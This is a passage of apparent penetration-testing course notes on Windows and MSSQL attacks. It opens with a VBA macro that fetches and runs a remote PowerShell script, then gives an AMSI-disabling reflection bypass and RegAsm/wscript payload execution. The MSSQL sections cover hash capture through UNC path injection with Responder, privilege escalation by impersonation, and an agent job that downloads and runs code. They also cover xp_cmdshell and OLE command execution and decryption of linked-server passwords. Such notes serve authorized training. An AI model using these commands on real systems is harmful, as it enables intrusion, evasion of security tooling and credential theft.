    strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

' String obfuscation - reverse the payload string
Dim strArg As String
strArg = StrReverse("your obfuscated payload here")

13.12.6 PowerShell Reflection AMSI Bypass (User Notes Variant)

# Reflection-based AMSI disable (original form - now often detected)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Multi-line form for clarity
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    .GetField('amsiInitFailed','NonPublic,Static')
    .SetValue($null,$true)

13.12.7 Skills Assessment: RegAsm LOLBIN

RegAsm.exe (Assembly Registration Utility) is another LOLBIN that can execute code via the [ComRegisterFunction] / [ComUnregisterFunction] attributes on a class marked with [System.Runtime.InteropServices.ComVisible(true)]. The invocation command is:

# Execute payload via RegAsm /U (unregister - triggers ComUnregisterFunction)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe /U <YOUR FILE>

13.12.8 Skills Assessment: VBScript with AMSI Bypass

' Basic VBScript payload template
Set objShell = CreateObject("WScript.Shell")   ' Create WScript.Shell object
objShell.Exec("C:\Windows\System32\calc.exe")  ' Execute target binary
# Execute VBScript (wscript uses AMSI - bypass required before execution)
C:\Windows\System32\wscript.exe <YOUR FILE>.vbs
Note: wscript.exe integrates with AMSI. A VBScript payload must either bypass AMSI (e.g., via the amsiInitFailed reflection technique embedded in the script) or avoid strings that trigger AMSI detection.

14. MSSQL, Exchange, and SCCM Attacks

14.1 Introduction to MSSQL Server

Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It uses Transact-SQL (T-SQL), an extension of SQL that adds procedural programming, local variables, and support functions.

Key attack surfaces: privilege escalation within the server, command execution on the underlying host, and lateral movement via linked servers.

ToolPlatformUse
impacket-mssqlclientLinuxConnect via MSSQL/Windows/Kerberos auth, pass-the-hash
SSMS (SQL Server Management Studio)WindowsOfficial GUI client
PowerUpSQLWindows/PowerShellAutomated enumeration and exploitation
Connecting with impacket-mssqlclient
# SQL Server authentication
impacket-mssqlclient ws_dev:[email protected]

# Execute a T-SQL query once connected
SQL (ws_dev  guest@master)> SELECT SYSTEM_USER;
Connecting via SSMS (DAC)

For a Dedicated Administrator Connection (DAC), prefix the server name with ADMIN: (e.g., ADMIN:SQL02) in the server name field.

14.2 Enumerating MSSQL Server

In MSSQL, logins are server-level principals; users are database-level. One login can map to one user per database.

Enumerate Logins and Server Roles
SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin,
       sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin,
       sl.dbcreator, sl.bulkadmin
FROM master.sys.server_principals r
LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid
WHERE r.type IN ('S','E','X','U','G');
Enumerate Databases and Trustworthy Status
SELECT a.name AS 'database', b.name AS 'owner', is_trustworthy_on
FROM sys.databases a
JOIN sys.server_principals b ON a.owner_sid = b.sid;
Enumerate Database Users
USE webshop;
EXECUTE sp_helpuser;

-- More complete listing of db_owner members (shows hidden entries)
USE webshop;
SELECT b.name, c.name
FROM webshop.sys.database_role_members a
JOIN webshop.sys.database_principals b ON a.role_principal_id = b.principal_id
LEFT JOIN webshop.sys.database_principals c ON a.member_principal_id = c.principal_id;

Methodology

  • Connect to the MSSQL instance: 
    impacket-mssqlclient ws_dev:[email protected]
  • Enumerate logins and server-level roles: 
    SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin,
       sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin,
       sl.dbcreator, sl.bulkadmin
FROM master.sys.server_principals r
LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid
WHERE r.type IN ('S','E','X','U','G');
  • Enumerate databases and trustworthy flag: 
    SELECT a.name AS 'database', b.name AS 'owner', is_trustworthy_on
FROM sys.databases a
JOIN sys.server_principals b ON a.owner_sid = b.sid;
  • Enumerate database users: 
    USE webshop;
EXECUTE sp_helpuser;

14.3 MSSQL Privilege Escalation

The goal is typically to reach a login with the sysadmin server-level role (comparable to BUILTIN\Administrators for local privilege escalation).

14.3.1 Impersonating Logins

EXECUTE AS switches the execution context to another login. Permissions are stored in sys.server_permissions.

-- Find logins we can impersonate
SELECT name FROM sys.server_permissions
JOIN sys.server_principals
ON grantor_principal_id = principal_id
WHERE permission_name = 'IMPERSONATE';

-- Impersonate the sa login
EXECUTE AS LOGIN = 'sa';

-- Revert to original context
REVERT;

14.3.2 Abusing Trustworthy Databases

If a database has TRUSTWORTHY set and you control a db_owner user, you can assign sysadmin to arbitrary logins. The exploit relies on WITH EXECUTE AS OWNER, which executes the stored procedure as the database owner (typically sa).

-- Switch to ws_user context (who has db_owner in webshop)
USE webshop;
EXECUTE AS LOGIN = 'ws_user';
SELECT IS_ROLEMEMBER('db_owner');

-- Create and execute privilege escalation stored procedure
CREATE PROCEDURE sp_privesc
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'ws_dev', 'sysadmin'
GO
EXECUTE sp_privesc;
DROP PROCEDURE sp_privesc;

-- Verify we now have sysadmin
REVERT;
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');

14.3.3 UNC Path Injection (Hash Capture)

Undocumented extended stored procedures that handle file paths can be pointed at an attacker-controlled SMB share to capture the NetNTLMv2 hash of the MSSQL service account.

ProcedureFunction
xp_fileexistChecks whether a file exists
xp_dirtreeReturns a directory tree from a given path
xp_subdirsReturns sub-directories of a given path
 
# Start Responder to capture the hash
sudo responder -I tun0 -v

-- Trigger authentication to attacker SMB share
EXEC xp_dirtree '\\<IP>\a';
EXEC xp_subdirs '\\<IP>\a';
EXEC xp_fileexist '\\<IP>\a';

# Crack the captured NetNTLMv2 hash
hashcat -m 5600 '<HASH>' /usr/share/wordlists/rockyou.txt

Methodology

  • Check which logins can be impersonated: 
    SELECT name FROM sys.server_permissions
JOIN sys.server_principals ON grantor_principal_id = principal_id
WHERE permission_name = 'IMPERSONATE';
  • Impersonate a sysadmin login: 
    EXECUTE AS LOGIN = 'sa';
  • Escalate via trustworthy DB (if db_owner): 
    USE webshop;
EXECUTE AS LOGIN = 'ws_user';
CREATE PROCEDURE sp_privesc WITH EXECUTE AS OWNER AS
EXEC sp_addsrvrolemember 'ws_dev', 'sysadmin'
GO
EXECUTE sp_privesc;
DROP PROCEDURE sp_privesc;
REVERT;
  • Capture NetNTLMv2 via UNC injection: 
    sudo responder -I tun0 -v
    EXEC xp_dirtree '\\<ATTACKER_IP>\a';
  • Crack captured hash: 
    hashcat -m 5600 '<HASH>' /usr/share/wordlists/rockyou.txt

14.4 MSSQL Command Execution

Three common techniques to execute OS commands from MSSQL (all require sysadmin).

Enable Advanced Options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

14.4.1 xp_cmdshell

xp_cmdshell spawns a cmd.exe as a child of sqlservr.exe. Disabled by default.

-- Enable
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute command
EXEC xp_cmdshell 'ipconfig';

-- Disable when done
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
EXEC sp_configure 'show advanced options', 0;
RECONFIGURE;

14.4.2 MSSQL Server Agent Jobs

Agent jobs are comparable to scheduled tasks. The PowerShell and CmdExec subsystems allow command execution. Requires the MSSQL Agent service to be running.

-- Create and immediately start a malicious agent job
USE msdb;
GO
EXEC sp_add_job
   @job_name = N'Malicious Job';
GO
EXEC sp_add_jobstep
   @job_name = N'Malicious Job',
   @step_name = N'Execute PowerShell Script',
   @subsystem = N'PowerShell',
   @command = N'(New-Object Net.WebClient).DownloadString("http://[target-ip]/a")|IEX;',
   @retry_attempts = 5,
   @retry_interval = 5;
GO
EXEC sp_add_jobserver
   @job_name = N'Malicious Job';
GO
EXEC sp_start_job
   @job_name = N'Malicious Job';
GO

-- Clean up
-- EXEC sp_delete_job @job_name = N'Malicious Job';
Note: The MSSQL Server Agent service (NT Service\sqlserveragent) has SeImpersonatePrivilege by default, enabling "potato" attacks to escalate to SYSTEM.

14.4.3 OLE Automation Stored Procedures

OLE Automation allows use of other languages (e.g., VBScript) from T-SQL via sp_OACreate and sp_OAMethod.

-- Enable OLE Automation
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'ole automation procedures', 1;
RECONFIGURE;

-- Execute command via wscript.shell
DECLARE @objShell INT;
DECLARE @output varchar(8000);
EXEC @output = sp_OACreate 'wscript.shell', @objShell Output;
EXEC sp_OAMethod @objShell, 'run', NULL, 'cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"';

Methodology

  • Enable and use xp_cmdshell: 
    EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
  • Execute command via Agent Job (blind): 
    USE msdb; GO
EXEC sp_add_job @job_name = N'Malicious Job'; GO
EXEC sp_add_jobstep @job_name = N'Malicious Job', @step_name = N'cmd',
   @subsystem = N'CmdExec', @command = N'whoami > C:\Windows\Tasks\out.txt'; GO
EXEC sp_add_jobserver @job_name = N'Malicious Job'; GO
EXEC sp_start_job @job_name = N'Malicious Job'; GO
  • Execute via OLE Automation: 
    EXEC sp_configure 'ole automation procedures', 1; RECONFIGURE;
DECLARE @objShell INT;
EXEC sp_OACreate 'wscript.shell', @objShell Output;
EXEC sp_OAMethod @objShell, 'run', NULL, 'cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"';

14.5 MSSQL Lateral Movement via Linked Servers

Linked servers allow executing T-SQL queries on remote MSSQL instances. Three remote execution methods exist:

MethodDescription
OPENQUERYExecute on a pre-defined linked server; returns one result set
EXECUTE ATExecute on a pre-defined linked server; supports multiple result sets
OPENROWSETAd-hoc connection to a remote server using inline connection string

14.5.1 Enumerating Linked Servers

-- Enumerate linked servers
EXEC sp_linkedservers;

-- Query a database on the linked server
SELECT * FROM OPENQUERY(SQL02, 'SELECT name, database_id, create_date FROM sys.databases');

-- Verify sysadmin on linked server (escape single quotes with '')
SELECT * FROM OPENQUERY(SQL02, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');

14.5.2 Remote Command Execution via EXECUTE AT

EXECUTE ('EXEC sp_configure "show advanced options", 1; RECONFIGURE;
EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE;
EXEC xp_cmdshell "whoami";') AT SQL02;

14.5.3 Decrypting Linked Server Passwords (Post-Exploitation)

Linked server credentials are stored in sys.syslnklgns, accessible only via DAC. They are symmetrically encrypted with the Service Master Key. The SMK is stored in sys.key_encryptions (key_id = 102) and encrypted with DPAPI.

-- Query via DAC (connect with ADMIN:<server>)
SELECT sysservers.srvname, syslnklgns.name, syslnklgns.pwdhash
FROM master.sys.syslnklgns
INNER JOIN master.sys.sysservers
ON syslnklgns.srvid = sysservers.srvid WHERE LEN(pwdhash) > 0;

-- View key encryptions
SELECT * FROM sys.key_encryptions;

-- Split pwdhash into IV and ciphertext
SELECT
  name,
  SUBSTRING(pwdhash, 5, 16) AS 'IV',
  SUBSTRING(pwdhash, 21, LEN(pwdhash) - 20) AS 'Ciphertext'
FROM sys.syslnklgns
WHERE LEN(pwdhash) > 0;
Decrypt the Service Master Key (PowerShell)
# Get entropy from registry (replace instance name as needed)
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.MSSQLSERVER\Security" -Name "Entropy"

# Decrypt SMK using DPAPI (LocalMachine scope)
$encryptedData = "0xFFFFFFFF500100<SNIP>"
$encryptedData = $encryptedData.Substring(18)
$encryptedData = [byte[]] -split ($encryptedData -replace '..', '0x$& ')
$entropy = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL16.MSSQLSERVER\Security" -Name "Entropy").Entropy
Add-Type -AssemblyName System.Security
$SMK = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedData, $entropy, 'LocalMachine')
Write-Host (($SMK|ForEach-Object ToString X2) -join '')

With the SMK (Key), IV, and Ciphertext, use CyberChef AES Decrypt to recover the plaintext password. Alternatively, use the Get-MSSQLLinkPasswords function from NetSPI's PowerShell module to automate the whole process.

Methodology

  • Enumerate linked servers: 
    EXEC sp_linkedservers;
  • Check sysadmin on linked server: 
    SELECT * FROM OPENQUERY(SQL02, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
  • Execute commands on linked server: 
    EXECUTE ('EXEC sp_configure "xp_cmdshell", 1; RECONFIGURE; EXEC xp_cmdshell "whoami";') AT SQL02;
  • Dump linked server credentials via DAC: 
    SELECT sysservers.srvname, syslnklgns.name, syslnklgns.pwdhash
FROM master.sys.syslnklgns
INNER JOIN master.sys.sysservers ON syslnklgns.srvid = sysservers.srvid
WHERE LEN(pwdhash) > 0;

14.6 Tool: Impacket MSSQLClient

MSSQLClient has built-in commands that automate enumeration, privilege escalation, and lateral movement.

Built-in Commands
SQL (ws_dev  guest@master)> help
   lcd {path}               - change local directory
   exit                     - terminate session
   enable_xp_cmdshell       - enable xp_cmdshell
   disable_xp_cmdshell      - disable xp_cmdshell
   enum_db                  - enum databases
   enum_links               - enum linked servers
   enum_impersonate         - check impersonatable logins
   enum_logins              - enum login users
   enum_users               - enum current db users
   enum_owner               - enum db owner
